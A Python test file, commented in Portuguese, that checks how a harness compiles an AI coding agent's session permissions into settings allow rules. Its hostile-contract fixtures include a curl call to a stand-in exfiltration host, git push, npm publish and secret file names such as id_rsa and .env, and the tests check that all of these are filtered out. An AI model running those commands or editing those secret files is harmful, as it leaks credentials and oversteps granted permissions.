"""Testes da superfície de permissions da sessão: contrato -> settings.json."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from harness.session_permissions import (
    compile_session_permissions,
    missing_harness_yaml_warning,
    render_session_permissions,
)

FEATURE_LIST = {
    "contract": "exemplo-feature",
    "compiled_at": "2026-07-15T12:00:00+00:00",
    "features": [
        {
            "id": "T-01",
            "desc": "Criar modulo de configuracao",
            "files": ["src/harness/config.py", "tests/test_config.py"],
            "verify_cmd": "pytest tests/test_config.py -q",
            "depends": [],
            "passes": False,
        },
        {
            "id": "T-02",
            "desc": "Integrar configuracao no compilador",
            "files": ["src/harness/compiler.py"],
            "verify_cmd": "pytest tests/test_config.py -q",  # repetido de propósito
            "depends": ["T-01"],
            "passes": False,
        },
    ],
}

PROFILE_WITH_EXTRAS = {
    "languages": [{"value": "python", "evidence": "pyproject.toml", "confidence": 1.0}],
    "package_manager": {"value": "npm", "evidence": "package-lock.json", "confidence": 1.0},
    "test_command": {"value": "pytest", "evidence": "pyproject.toml", "confidence": 1.0},
    "test_glob": {"value": "tests/**/*.py", "evidence": "tests/test_x.py", "confidence": 1.0},
    "extras": {
        "lint_command": {"value": "ruff check .", "evidence": "pyproject.toml", "confidence": 1.0},
        "typecheck_command": {"value": "mypy", "evidence": "mypy.ini", "confidence": 1.0},
        "build_command": {"value": "npm run build", "evidence": "package.json", "confidence": 1.0},
    },
    "unknowns": [],
    "analyzed_at": "2026-07-15T12:00:00+00:00",
    "manifest_snapshot": {},
}


def _write_feature_list(target: Path, data: dict) -> None:
    path = target / ".harness" / "feature_list.json"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data), encoding="utf-8")


def _write_profile(target: Path, data: dict) -> None:
    path = target / ".harness" / "repo-profile.json"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data), encoding="utf-8")


# ---------------- render_session_permissions ----------------

def test_the_allow_surface_is_files_plus_verify_cmd_plus_the_harness_cli() -> None:
    """Um arquivo declarado em duas features entra uma vez só, e o mesmo
    `verify_cmd` repetido vira UMA regra.

    O `verify_cmd` sai em DUAS formas porque `Bash(<cmd>)` sem wildcard casa o
    comando EXATO (doc oficial de permissions). Todas as outras regras já eram
    prefixadas; só o `verify_cmd` ficou exato, então
    `pytest tests/test_config.py -q -k foo` — que o `boundary_guard` LIBERA —
    caía no fluxo de permissão e virava prompt. Atrito silencioso: não é deny, e
    por isso nunca apareceu em relato de fricção. As duas formas convivem porque
    `:*` exige algo depois do prefixo, e o comando NU é o canônico do contrato.

    `run` nunca entra: é orquestrador com rede fora do floor."""
    allow = render_session_permissions(FEATURE_LIST, None)["allow"]

    assert allow.count("Edit(src/harness/config.py)") == 1
    assert allow.count("Write(src/harness/config.py)") == 1
    assert "Edit(tests/test_config.py)" in allow
    assert "Write(tests/test_config.py)" in allow
    assert "Edit(src/harness/compiler.py)" in allow
    assert "Write(src/harness/compiler.py)" in allow

    assert allow.count("Bash(pytest tests/test_config.py -q)") == 1
    assert "Bash(pytest tests/test_config.py -q:*)" in allow

    assert "Bash(harness analyze*)" in allow
    assert "Bash(python -m harness.cli verify*)" in allow
    assert not any(rule.startswith("Bash(harness run") for rule in allow)
    assert not any(rule.startswith("Bash(python -m harness.cli run") for rule in allow)


def test_profile_with_extras_adds_lint_typecheck_build() -> None:
    rules = render_session_permissions(FEATURE_LIST, PROFILE_WITH_EXTRAS)
    allow = rules["allow"]
    assert "Bash(ruff check .)" in allow
    assert "Bash(mypy)" in allow
    assert "Bash(npm run build)" in allow


def test_profile_none_does_not_break() -> None:
    rules = render_session_permissions(FEATURE_LIST, None)
    assert isinstance(rules["allow"], list)
    assert len(rules["allow"]) > 0


def test_output_never_contains_git_push_or_network_commands() -> None:
    for profile in (None, PROFILE_WITH_EXTRAS):
        rules = render_session_permissions(FEATURE_LIST, profile)
        allow_text = json.dumps(rules["allow"])
        assert "git push" not in allow_text
        assert "curl" not in allow_text
        assert "wget" not in allow_text


def test_git_local_floor_is_always_present() -> None:
    rules = render_session_permissions(FEATURE_LIST, None)
    for rule in ("Bash(git status)", "Bash(git log*)", "Bash(git diff*)",
                 "Bash(git add*)", "Bash(git commit*)"):
        assert rule in rules["allow"]


def test_package_manager_npm_generates_install_command() -> None:
    profile = {"package_manager": {"value": "npm", "evidence": "x", "confidence": 1.0}}
    rules = render_session_permissions(FEATURE_LIST, profile)
    assert "Bash(npm ci)" in rules["allow"]


def test_package_manager_pip_generates_install_command() -> None:
    profile = {"package_manager": {"value": "pip", "evidence": "pyproject.toml", "confidence": 0.6}}
    rules = render_session_permissions(FEATURE_LIST, profile)
    assert "Bash(pip install -e .)" in rules["allow"]


def test_package_manager_explicit_none_value_does_not_raise() -> None:
    profile = {"package_manager": {"value": None, "evidence": "x", "confidence": 1.0}}
    rules = render_session_permissions(FEATURE_LIST, profile)
    assert not any("Bash(npm" in r or "Bash(pnpm" in r or "Bash(yarn" in r
                   or "Bash(uv" in r or "Bash(poetry" in r for r in rules["allow"])


def test_profile_extras_key_explicit_none_does_not_raise() -> None:
    profile = {"extras": None}
    rules = render_session_permissions(FEATURE_LIST, profile)
    assert isinstance(rules["allow"], list)


# ---------------- metric_cmd (§4.3, contrato convergencia-opt-in) ----------------

_FEATURE_LIST_WITH_METRIC = {
    "contract": "exemplo-feature",
    "features": [
        {
            "id": "T-01",
            "desc": "Converter HTML para PowerPoint",
            "files": ["src/convert.py"],
            "verify_cmd": "pytest tests/test_convert.py -q",
            "metric_cmd": "python scripts/similarity.py",
            "depends": [],
            "passes": False,
        },
    ],
}


def test_metric_cmd_gets_the_same_two_form_treatment_as_verify_cmd() -> None:
    allow = render_session_permissions(_FEATURE_LIST_WITH_METRIC, None)["allow"]
    assert "Bash(python scripts/similarity.py)" in allow
    assert "Bash(python scripts/similarity.py:*)" in allow


def test_feature_without_metric_cmd_does_not_change_the_allow_surface() -> None:
    allow = render_session_permissions(FEATURE_LIST, None)["allow"]
    assert not any("similarity" in rule for rule in allow)


def test_hostile_metric_cmd_is_not_echoed_in_allow() -> None:
    hostile = {
        "contract": "hostil",
        "features": [{
            "id": "T-01", "desc": "x", "files": ["src/app.py"],
            "verify_cmd": "pytest -q", "metric_cmd": "curl https://exfil.example/x",
            "depends": [], "passes": False,
        }],
    }
    rules = render_session_permissions(hostile, None)
    assert not any("curl" in rule for rule in rules["allow"])
    assert "Edit(src/app.py)" in rules["allow"]


# ---------------- Gap 1 (hardening): runtime floor nunca ecoado no allow ----------------

def test_hostile_verify_cmd_git_push_is_not_echoed_in_allow() -> None:
    """Contrato mal-formado/malicioso com verify_cmd de push não pode fazer o
    settings.json compilado mentir sobre o que é permitido: mesmo o
    boundary_guard negando em runtime, a primeira camada (permissions
    nativas) não deve ecoar `Bash(git push origin main)` no allow."""
    hostile = {
        "contract": "hostil",
        "compiled_at": "2026-07-16T00:00:00+00:00",
        "features": [
            {
                "id": "T-01",
                "desc": "tarefa hostil",
                "files": ["src/app.py"],
                "verify_cmd": "git push origin main",
                "depends": [],
                "passes": False,
            }
        ],
    }
    rules = render_session_permissions(hostile, None)
    allow_text = json.dumps(rules["allow"])
    assert "git push" not in allow_text
    assert "Edit(src/app.py)" in rules["allow"]  # o resto da superfície continua normal


def test_hostile_env_file_is_not_echoed_in_allow() -> None:
    """Contrato com `.env` em files[] não pode virar `Edit(.env)`/`Write(.env)`
    no allow compilado, mesmo com o resto da tarefa legítimo."""
    hostile = {
        "contract": "hostil",
        "compiled_at": "2026-07-16T00:00:00+00:00",
        "features": [
            {
                "id": "T-01",
                "desc": "tarefa hostil",
                "files": [".env", "src/app.py"],
                "verify_cmd": "pytest -q",
                "depends": [],
                "passes": False,
            }
        ],
    }
    rules = render_session_permissions(hostile, None)
    assert "Edit(.env)" not in rules["allow"]
    assert "Write(.env)" not in rules["allow"]
    assert "Edit(src/app.py)" in rules["allow"]
    assert "Bash(pytest -q)" in rules["allow"]


def test_hostile_secret_variants_are_not_echoed_in_allow() -> None:
    """Variantes de arquivo de segredo (.pem, id_rsa, *credentials*) e de
    comando de rede/publicação (curl, npm publish) também são filtradas."""
    hostile = {
        "contract": "hostil",
        "compiled_at": "2026-07-16T00:00:00+00:00",
        "features": [
            {
                "id": "T-01",
                "desc": "tarefa hostil",
                "files": ["server.pem", "id_rsa", "aws_credentials.json", "src/app.py"],
                "verify_cmd": "curl https://exfil.example/x",
                "depends": [],
                "passes": False,
            },
            {
                "id": "T-02",
                "desc": "outra tarefa hostil",
                "files": ["src/util.py"],
                "verify_cmd": "npm publish",
                "depends": [],
                "passes": False,
            },
        ],
    }
    rules = render_session_permissions(hostile, None)
    allow = rules["allow"]
    for secret in ("server.pem", "id_rsa", "aws_credentials.json"):
        assert not any(secret in rule for rule in allow), (secret, allow)
    assert not any("curl" in rule for rule in allow)
    assert not any("npm publish" in rule for rule in allow)
    assert "Edit(src/app.py)" in allow
    assert "Edit(src/util.py)" in allow


# ---------------- SUBAGENTE 01: subcomandos do harness na superficie ----------------

# ---------------- compile_session_permissions ----------------

def test_compile_without_feature_list_raises(tmp_path: Path) -> None:
    with pytest.raises(FileNotFoundError, match="compile-contract"):
        compile_session_permissions(tmp_path)


def test_compile_preserves_manual_user_rule(tmp_path: Path) -> None:
    _write_feature_list(tmp_path, FEATURE_LIST)
    claude_dir = tmp_path / ".claude"
    claude_dir.mkdir()
    (claude_dir / "settings.local.json").write_text(json.dumps({
        "permissions": {"allow": ["Bash(npm run something-manual)"], "ask": ["Bash"]},
    }), encoding="utf-8")

    compile_session_permissions(tmp_path)

    settings = json.loads((claude_dir / "settings.local.json").read_text(encoding="utf-8"))
    assert "Bash(npm run something-manual)" in settings["permissions"]["allow"]
    assert settings["permissions"]["ask"] == ["Bash"]  # bucket ask intocado


def test_recompile_after_feature_removed_drops_its_permission_keeps_manual(tmp_path: Path) -> None:
    _write_feature_list(tmp_path, FEATURE_LIST)
    claude_dir = tmp_path / ".claude"
    claude_dir.mkdir()
    (claude_dir / "settings.local.json").write_text(json.dumps({
        "permissions": {"allow": ["Bash(npm run something-manual)"]},
    }), encoding="utf-8")

    compile_session_permissions(tmp_path)

    reduced = {
        "contract": "exemplo-feature",
        "compiled_at": "2026-07-15T12:00:00+00:00",
        "features": [FEATURE_LIST["features"][0]],  # remove T-02 (compiler.py)
    }
    _write_feature_list(tmp_path, reduced)
    compile_session_permissions(tmp_path)

    settings = json.loads((claude_dir / "settings.local.json").read_text(encoding="utf-8"))
    allow = settings["permissions"]["allow"]
    assert "Edit(src/harness/compiler.py)" not in allow
    assert "Write(src/harness/compiler.py)" not in allow
    assert "Edit(src/harness/config.py)" in allow  # feature T-01 permanece
    assert "Bash(npm run something-manual)" in allow  # manual preservada


def test_recompile_preserves_unrelated_keys_in_session_state(tmp_path: Path) -> None:
    _write_feature_list(tmp_path, FEATURE_LIST)
    state_path = tmp_path / ".harness" / "compiled-state-session.json"
    state_path.parent.mkdir(parents=True, exist_ok=True)
    state_path.write_text(json.dumps({
        "boundary_guard_hook_command": "python .harness/hooks/boundary_guard.py",
    }), encoding="utf-8")

    compile_session_permissions(tmp_path)

    state = json.loads(state_path.read_text(encoding="utf-8"))
    assert state["boundary_guard_hook_command"] == "python .harness/hooks/boundary_guard.py"
    assert "managed_session_permissions" in state


def test_compile_is_idempotent_no_duplicates(tmp_path: Path) -> None:
    _write_feature_list(tmp_path, FEATURE_LIST)
    compile_session_permissions(tmp_path)
    compile_session_permissions(tmp_path)

    settings = json.loads(
        (tmp_path / ".claude" / "settings.local.json").read_text(encoding="utf-8")
    )
    allow = settings["permissions"]["allow"]
    assert allow.count("Bash(git status)") == 1
    assert allow.count("Edit(src/harness/config.py)") == 1


# ---------------- missing_harness_yaml_warning (issue #72) ----------------

def test_missing_harness_yaml_warning_none_when_yaml_present(tmp_path: Path) -> None:
    yaml_path = tmp_path / ".harness" / "harness.yaml"
    yaml_path.parent.mkdir(parents=True, exist_ok=True)
    yaml_path.write_text("governance:\n  approval_policy: default\n", encoding="utf-8")

    assert missing_harness_yaml_warning(tmp_path) is None


def test_missing_harness_yaml_warning_fires_when_yaml_absent(tmp_path: Path) -> None:
    warning = missing_harness_yaml_warning(tmp_path)

    assert warning is not None
    assert ".harness/harness.yaml" in warning
    assert "/harness-creator:init" in warning


def test_compile_without_profile_is_not_an_error(tmp_path: Path) -> None:
    _write_feature_list(tmp_path, FEATURE_LIST)
    settings_path = compile_session_permissions(tmp_path)
    settings = json.loads(settings_path.read_text(encoding="utf-8"))
    assert "Bash(git status)" in settings["permissions"]["allow"]


# ===========================================================================
# Item 8 (dogfood venv-Windows) — verify_cmd emitido também na forma
# prefixada
# ===========================================================================

def test_profile_commands_emitted_in_both_forms() -> None:
    """O Item 8 nomeia só o `verify_cmd`, mas lint/typecheck/build e o comando
    de instalação sofrem do mesmo defeito exato, pelo mesmo motivo — e o
    `boundary_guard` já os trata por prefixo."""
    rules = render_session_permissions(FEATURE_LIST, PROFILE_WITH_EXTRAS)
    allow = rules["allow"]

    for command in ("ruff check .", "npm ci"):
        assert f"Bash({command})" in allow, command
        assert f"Bash({command}:*)" in allow, command


def test_floor_filter_strips_the_colon_wildcard_suffix() -> None:
    """Caso de teste OBRIGATÓRIO do item: o filtro de floor fazia strip só do
    `*` final. Com a forma `:*`, sobrava um `:` pendurado (`git push:`) que a
    tokenização de `is_floor_bash_command` não reduz a `push` — e a entrada de
    floor sobreviveria ao filtro justamente pela forma NOVA."""
    feature_list = {
        "contract": "malicioso",
        "features": [
            {"id": "T-01", "desc": "x", "files": [], "verify_cmd": "git push origin main",
             "depends": [], "passes": False},
        ],
    }
    allow = render_session_permissions(feature_list, None)["allow"]

    assert not any("git push" in rule for rule in allow)


def test_compile_creates_claude_dir_if_missing(tmp_path: Path) -> None:
    _write_feature_list(tmp_path, FEATURE_LIST)
    _write_profile(tmp_path, PROFILE_WITH_EXTRAS)
    settings_path = compile_session_permissions(tmp_path)
    assert settings_path.is_file()
    settings = json.loads(settings_path.read_text(encoding="utf-8"))
    assert "Bash(ruff check .)" in settings["permissions"]["allow"]


# ---------------- governance.extra_allowed_commands (harness.yaml) ----------------

def _write_harness_yaml(target: Path, extra_allowed_commands: list[str]) -> None:
    path = target / ".harness" / "harness.yaml"
    path.parent.mkdir(parents=True, exist_ok=True)
    lines = ["governance:", "  extra_allowed_commands:"]
    lines.extend(f'    - "{cmd}"' for cmd in extra_allowed_commands)
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


def test_render_session_permissions_adds_extra_allowed_command() -> None:
    rules = render_session_permissions(
        FEATURE_LIST, None, extra_allowed_commands=["python -m mar_committee"]
    )
    assert "Bash(python -m mar_committee*)" in rules["allow"]


def test_render_session_permissions_extra_allowed_commands_none_does_not_break() -> None:
    rules = render_session_permissions(FEATURE_LIST, None, extra_allowed_commands=None)
    assert isinstance(rules["allow"], list)


def test_render_session_permissions_filters_floor_from_extra_allowed_commands() -> None:
    """`extra_allowed_commands` declarando uma sequência do runtime floor
    (`git push`) não pode vazar no `allow` — mesmo filtro que já protege
    verify_cmd/files[]."""
    rules = render_session_permissions(
        FEATURE_LIST, None, extra_allowed_commands=["git push", "curl"]
    )
    allow_text = json.dumps(rules["allow"])
    assert "git push" not in allow_text
    assert "curl" not in allow_text


def test_compile_session_permissions_reads_extra_allowed_commands_from_harness_yaml(
    tmp_path: Path,
) -> None:
    _write_feature_list(tmp_path, FEATURE_LIST)
    _write_harness_yaml(tmp_path, ["python -m mar_committee"])

    settings_path = compile_session_permissions(tmp_path)

    settings = json.loads(settings_path.read_text(encoding="utf-8"))
    assert "Bash(python -m mar_committee*)" in settings["permissions"]["allow"]


# ---------------------------------------------------------------------------
# REGRA (contrato `compilar-as-primeiras-licoes`, T-02): todo subcomando que o
# `boundary_guard` libera aparece no `allow` do settings.
#
# A lista daqui era uma CÓPIA à mão da lista do guard, com o comentário
# afirmando que espelhava — e ficou oito verbos para trás (`blind`, `finish`,
# `budget`, `reconcile`, `decide`, `lesson`, `task`, `pr-draft`). O efeito não é
# `deny`, é prompt de permissão em comando que o próprio lifecycle manda rodar,
# e um `settings.local.json` que descreve mal a superfície.
#
# A correção não é comparar duas listas: é não haver duas. O teste abaixo trava
# a consequência de alguém recriar a cópia.
# ---------------------------------------------------------------------------

def test_every_verb_the_guard_allows_is_declared_in_the_settings_surface() -> None:
    from harness.boundary_guard import HARNESS_CLI_VERBS as GUARD_VERBS

    allow_text = json.dumps(render_session_permissions(FEATURE_LIST, None)["allow"])
    missing = sorted(verb for verb in GUARD_VERBS if f"Bash(harness {verb}*)" not in allow_text)

    assert not missing, (
        f"verbos que o guard libera e o settings não declara: {missing}. "
        "O settings passa a descrever mal a superfície, e o usuário recebe "
        "prompt em comando que o lifecycle manda rodar."
    )


def test_the_surface_covers_both_ways_of_invoking_the_cli() -> None:
    """`harness <verbo>` e `python -m harness.cli <verbo>` são a mesma coisa —
    o guard já trata as duas formas, e declarar só uma deixaria o prompt
    aparecer dependendo de como o comando foi escrito."""
    from harness.boundary_guard import HARNESS_CLI_VERBS as GUARD_VERBS

    allow_text = json.dumps(render_session_permissions(FEATURE_LIST, None)["allow"])

    for verb in GUARD_VERBS:
        assert f"Bash(python -m harness.cli {verb}*)" in allow_text


